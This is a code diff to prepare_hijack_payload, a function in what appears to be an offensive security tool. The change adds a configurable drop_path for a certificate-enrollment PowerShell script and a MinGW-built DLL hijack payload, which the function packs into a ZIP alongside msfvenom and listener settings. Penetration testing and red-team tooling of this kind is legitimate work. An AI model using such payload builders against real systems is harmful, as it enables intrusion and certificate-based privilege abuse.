@@ -177,6 +177,7 @@ def prepare_hijack_payload(
     lhost: str | None,
     lport: int,
     payload_dll: Path | None,
+    drop_path: str = r"C:\ProgramData",
     exclude_ips: set[str] | None = None,
     auto_install_msfvenom: bool = True,
     arch: TargetArch | None = None,
@@ -220,9 +221,10 @@ def prepare_hijack_payload(
             ca_name=enroll_ca_name,
             profile=enroll_profile,
             run_as_user=enroll_run_as_user,
+            drop_path=drop_path,
         )
         (certs_dir / "enroll.ps1").write_text(ps + "\n", encoding="utf-8")
-        build_cert_enroll_dll_mingw(out_path=dll_path, arch=target_arch)
+        build_cert_enroll_dll_mingw(out_path=dll_path, arch=target_arch, drop_path=drop_path)
         zip_path = pack_dll_zip(dll_path, zip_name, payloads_dir)
         print_success(f"enroll payload ZIP → {zip_path}")
         return PayloadBuildResult(
